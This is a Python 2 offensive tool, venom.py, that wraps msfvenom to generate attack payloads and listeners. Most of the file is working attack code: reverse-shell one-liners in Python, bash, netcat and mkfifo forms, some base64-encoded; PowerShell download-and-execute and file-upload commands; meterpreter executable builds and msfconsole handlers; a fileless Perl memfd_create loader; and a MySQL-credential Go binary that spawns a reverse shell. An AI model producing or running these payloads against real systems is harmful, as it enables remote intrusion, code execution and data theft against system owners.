#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▌ ▐·▄▄▄ . ▐ ▄       • ▌ ▄ ·.                                                                               #
#▪█·█▌▀▄.▀·•█▌▐█▪     ·██ ▐███▪                                                                             #
#▐█▐█•▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▐█ ▌▐▌▐█·                                                                             #
#███ ▐█▄▄▌██▐█▌▐█▌.▐▌██ ██▌▐█▌                                                                              #
#. ▀   ▀▀▀ ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀                                                                             #
#                                                                                                           #
# venom.py - nighter@nighter.se                                                                             #
#                                                                                                           #
# DATE                                                                                                      #
# 14/06/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
#  Just a wrapper around msvenom to simplify payload creation                                               #
#                                                                                                           #
# nighter - nighter@nighter.se                                                                              #
#                                                                                                           #
#############################################################################################################

import random
import getpass
import signal
import time
import sys
import os
import termios
import select
import socket
import fcntl
import argparse
import base64


# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty  = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [ [ sock, [] ], [ pty, [] ] ]
        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [ sock, pty ]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def create_perl_mem_payload(type):

    if os.path.isfile('%s_payload' % type) is False:
        print("Missing payload file")
        return False

    payload_file = '%s_payload' % type
    perl_payload_file = '%s_payload.pl' % type

    payload = '''#!/usr/bin/env perl 
use warnings;
use strict;
$|=1;
my $name = "";
my $fd = syscall(319, $name, 1);
if (-1 == $fd) {
   die "memfd_create: $!"; 
}
print "fd $fd\\n";
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
'''
    with open(perl_payload_file, 'w') as f:
        f.write(payload)

    command = '''perl -e '$/=\\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \\$!/;\\n"while(<>)' %s >> %s''' % (payload_file, perl_payload_file)
    os.system(command)

    payload = '''exec {"/proc/$$/fd/$fd"} "%s" or die "exec: $!";''' % payload_file
    with open(perl_payload_file, 'a') as f:
        f.write(payload)

    print("[+] Saved %s" % perl_payload_file)

def msfvenom(type, lhost, lport):

    if type == 'win64':
        command = "msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
    elif type == 'win32':
        command = "msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
    elif type == 'lin64' or type == 'mperl64':
        command = "msfvenom --platform linux -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
    elif type == 'lin32' or type == 'mperl32':
        command = "msfvenom --platform linux -a x86 -p linux/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
    else:
        print_usage()

    os.system(command)
    print("[+] Saved %s_payload" % type)

    if type == 'mperl64' or type == 'mperl32':
        create_perl_mem_payload(type)


def listener(type, lhost, lport):

    payload = "use exploit/multi/handler\n"

    if type == 'win64s':
        payload += "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
    elif type == 'win32s':
        payload += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
    elif type == 'lin64s':
        payload += "set PAYLOAD linux/x64/meterpreter/reverse_tcp\n"
    elif type == 'lin32s':
        payload += "set PAYLOAD linux/meterpreter/reverse_tcp\n"
    else:
        print_usage()

    payload += "set LHOST %s\n" % lhost
    payload += "set LPORT %s\n" % lport
    payload += "set ExitOnSession false\n"
    payload += "exploit -j -z\n"

    with open('/tmp/meterpreter.rc', 'w') as file:
        file.write(payload)

    command = "msfconsole -r /tmp/meterpreter.rc"
    os.system(command)

def build_mysql_payload(lhost, lport):

    if os.path.isfile('/usr/bin/go') is False:
        print("go is required to compile this payload")
        sys.exit(0)

    username = raw_input("username> ")
    password = raw_input("password> ")

    if len(password) == 0 or len(username) == 0:
        print("Credentials is required for mysql payload")
        sys.exit(0)

    payload ='''package main

import (
	"github.com/ThomasRooney/gexpect"
	"fmt"
	"os"
)

func main() {

	child, err := gexpect.Spawn("mysql -u %s -p%s")''' % (username, password)
    payload += '''
    
	if err != nil {
		panic(err)
	}

	match, _ := child.ExpectRegexFind(".*[m|M][y|Y][s|S][q|Q][l|L].*")

	if len(match) == 0 {
		fmt.Println("Wrong credentials.")
		child.Close()
		os.Exit(3)
	}
'''
    payload += '''child.SendLine("\\\! python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\"%s\\", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/bash\\");s.close()'")''' % (lhost, lport)
    payload += '''
    child.Interact()
	child.Close()
}'''

    with open('/tmp/mysql_x64.go', 'w') as f:
        f.write(payload)

    print("Created mysql_x64")
    os.system('go build -o ./mysql_x64 /tmp/mysql_x64.go')


def python_reverse_shell(lhost,lport, ver=''):
    python_rev_shell = '''python%s -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
  s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (ver, lhost, lport)

    _encoded = base64.b64encode(python_rev_shell)
    return 'echo %s|base64 -d|bash' % _encoded


def print_usage():
    print ("""
 ▌ ▐·▄▄▄ . ▐ ▄       • ▌ ▄ ·.
▪█·█▌▀▄.▀·•█▌▐█▪     ·██ ▐███▪
▐█▐█•▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▐█ ▌▐▌▐█·
 ███ ▐█▄▄▌██▐█▌▐█▌.▐▌██ ██▌▐█▌
. ▀   ▀▀▀ ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀
Simplifies payload creation and listener.

  <~~~~~~~~~~~~~~~~~~~~~~~[Payloads]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    win64    <LHOST> <LPORT>  |   x64 Windows payload
    win32    <LHOST> <LPORT>  |   x32 Windows payload
    lin64    <LHOST> <LPORT>  |   x64 Linux payload
    lin32    <LHOST> <LPORT>  |   x32 Linux payload
    mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
                              | 
  <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    python   <LHOST> <LPORT>  |   python reverse_tcp payload
    python2  <LHOST> <LPORT>  |   python2 reverse_tcp payload
    python3  <LHOST> <LPORT>  |   python3 reverse_tcp payload    
    bash     <LHOST> <LPORT>  |   bash reverse_tcp payload
    ncbash   <LHOST> <LPORT>  |   nc bash combined reverse_tcp payload
    b64py    <LHOST> <LPORT>  |   base64 encoded python payload
    b64py2   <LHOST> <LPORT>  |   base64 encoded python2 payload
    b64py3   <LHOST> <LPORT>  |   base64 encoded python3 payload
    nc       <LHOST> <LPORT>  |   np reverse_tcp payload
  <~~~~~~~~~~~~~~~~~~~~~~~[Win Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~>             
                              |
    winhttp  <LHOST> <LPORT>  |    windows download and execute  
    windl    <LHOST> <LPORT>  |    windows download file
    winup    <LHOST> <LPORT>  |    windows webdav file upload
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Listen]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    win64s   <LHOST> <LPORT>  |   x64 Windows meterpreter listen
    win32s   <LHOST> <LPORT>  |   x32 Windows meterpreter listen
    lin64s   <LHOST> <LPORT>  |   x64 Linux meterpreter listen
    lin32s   <LHOST> <LPORT>  |   x32 Linux meterpreter listen
    pythons  <LHOST> <LPORT>  |   python listener
    ncs      <LHOST> <LPORT>  |   netcat listener
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Advanced]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    mperl64  <LHOST> <LPORT>  |   x64 Linux elf memory inject binary                                               
    mperl32  <LHOST> <LPORT>  |   x32 Linux elf memory inject binary
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~~[Misc]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    httpsrv  <HOST>  <PORT>   |  Http server listen in current dir     
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

    """)

    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 4:
        print_usage()

    type = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    if type == 'b64py':
        print(python_reverse_shell(lhost,lport, ver=''))
        sys.exit(0)

    if type == 'b64py2':
        print(python_reverse_shell(lhost,lport, ver='2'))
        sys.exit(0)

    if type == 'b64py3':
        print(python_reverse_shell(lhost,lport, ver='3'))
        sys.exit(0)

    if type == 'httpsrv':

        if int(lport) < 1025:
            os.system("sudo python -m http.server --bind %s %s" % (lhost, lport))
            sys.exit(0)

        os.system("python -m http.server --bind %s %s" % (lhost, lport))
        sys.exit(0)       

    if type == 'winhttp':
        _payload = '''powershell "IEX(New-Object Net.WebClient).downloadString('http://%s:%s/shell.ps1')"''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)        

    if type == 'windl':
        _payload = '''powershell -command "& { iwr http://%s:%s/shell.ps1 -OutFile shell.ps1 }"''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)        

    if type == 'winup':
        _payload = '''powershell "$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile('http://%s:%s/filename', 'PUT', 'c:\\filename')"''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)       


    if type == 'python':
        _payload = '''python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'python2':
        _payload = '''python2 -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'python3':
        _payload = '''python3 -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'bash':
        _payload = '''bash -i >& /dev/tcp/%s/%s 0>&1''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'nc':
        _payload = '''nc -e /bin/sh %s %s''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'ncbash':
        _payload = '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'pythons':
        # Start listener
        s = Shell((lhost, int(lport)), bind=True)
        print("Waiting for connection on %s:%s" %(lhost, lport))
        s.handle()
        sys.exit(0)

    if type == 'ncs':
        os.system('nc -l %s -nvvp %s' % (lhost, lport))
        sys.exit(0)

    if type == 'mysql64':
        build_mysql_payload(lhost, lport)
        sys.exit(0)

    if type[-1] == 's':
       listener(type, lhost, lport)
       sys.exit(0)

    msfvenom(type, lhost, lport)
